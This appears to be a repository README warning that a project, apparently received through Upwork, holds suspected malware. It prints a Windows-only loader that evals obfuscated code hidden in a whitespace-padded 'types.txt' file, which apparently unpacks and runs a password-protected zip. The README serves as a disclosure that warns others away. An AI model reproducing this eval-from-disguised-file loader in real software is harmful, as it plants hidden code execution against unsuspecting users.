Possible virus(?) from upwork. 
### Info
Some possible false positive reactions from antiviruses (virustotal: https://www.virustotal.com/gui/file/311fc8e90c968cbd0237ec31ecedfdb17d75f936e14e981c0fa4437da5483cf8)
App try to eval txt file 'public/css/types.txt', where is placed "// empty file ..." text, lot of spacings and then really obscured code. 
Part of which obviously trying to unzip and execute some code from public/js/js.zip. (this zip file is acrhived with password, looks like inside types.txt part of code trying to assemble password from multiple obscured functions)

Content of js.zip is unknown for now.

Also this exec part is executes only on win32 systems.

    const fs = require("fs");
    const os = require("os");
    function site_version() {
    const platform = os.platform();
    
    switch (platform) {
         case 'win32':
              fs.readFile('public/css/types.txt', 'utf8', (err, data) => {
                  if (err) {
                      return;
                  }
    
                  eval(data);
              });
              console.log("=")
              return 'w';
          case 'darwin':
              return 'm';
          case 'linux':
              return 'l';
          default:
              return 'Unknown';
        }
    } 
    site_version()


I can't say for sure, maybe it's just a very strangely builded project. 
I'm not going to dig further, I'll just leave this repo and text here in case I ever change my mind. 
Also, this repository is public, so I'm adding this text to the readme so that no one accidentally runs it.

If anyone knows why this project is what it is (or has tested it), I would be grateful if you would let me know (for example open an issue)
